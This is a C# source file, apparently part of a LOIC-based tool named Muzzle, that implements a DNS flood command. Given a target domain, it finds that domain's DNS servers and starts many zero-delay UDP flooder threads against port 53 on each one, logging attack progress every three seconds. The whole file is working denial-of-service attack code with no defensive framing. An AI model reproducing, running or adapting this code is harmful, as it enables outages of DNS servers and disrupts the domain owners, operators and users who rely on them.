using LOIC;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Muzzle
{
    internal class FloodDnsCommand
    {
        private static List<IFlooder> arr = new List<IFlooder>();

        public static void Execute(FloodDnsOptions options)
        {
            if (!DomainTools.IsValidTarget(options.Domain))
                return;

            Console.WriteLine($"Target: {options.Domain}");
            Console.WriteLine($"Threads per server: {options.ThreadsPerServer}");

            Console.WriteLine();
            Console.WriteLine("Sniffing DNS servers...");
            var dnsIpAddresses = DomainTools.GetDnsServers(options.Domain);

            if (dnsIpAddresses.Count == 0)
            {
                Console.WriteLine("DNS servers not found");
                return;
            }

            foreach (var ip in dnsIpAddresses)
            {
                Console.WriteLine(ip);
            }

            Console.WriteLine();
            Console.WriteLine($"Attacking {dnsIpAddresses.Count} DNS servers...");

            StartAttack(dnsIpAddresses, options.ThreadsPerServer);

            MonitorProgress();
        }

        private static void MonitorProgress()
        {
            while (true)
            {
                int iIdle = 0;
                int iConnecting = 0, iRequesting = 0, iDownloading = 0;
                int iDownloaded = 0, iRequested = 0, iFailed = 0;

                for (int a = (arr.Count - 1); a >= 0; a--)
                {
                    if (arr[a] != null && (arr[a] is cHLDos))
                    {
                        cHLDos c = arr[a] as cHLDos;

                        iDownloaded += c.Downloaded;
                        iRequested += c.Requested;
                        iFailed += c.Failed;
                        if (c.State == ReqState.Ready ||
                            c.State == ReqState.Completed)
                            iIdle++;
                        if (c.State == ReqState.Connecting)
                            iConnecting++;
                        if (c.State == ReqState.Requesting)
                            iRequesting++;
                        if (c.State == ReqState.Downloading)
                            iDownloading++;
                    }
                }

                Console.WriteLine($"Idle: {iIdle}; Connecting: {iConnecting}; Requesting: {iRequesting}; Requested: {iRequested}; Failed: {iFailed}");

                Thread.Sleep(3000);
            }
        }

        private static void StartAttack(List<IPAddress> dnsIpAddresses, int threadsPerServer)
        {
            for (int i = 0; i < threadsPerServer; i++)
            {
                foreach (var ip in dnsIpAddresses)
                {
                    //var ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
                    var ts = new XXPFlooder(ip.ToString(), 53, (int)Protocol.UDP, 0, true, "", true);
                    ts.Start();
                    arr.Add(ts);
                }
            }
        }
    }
}
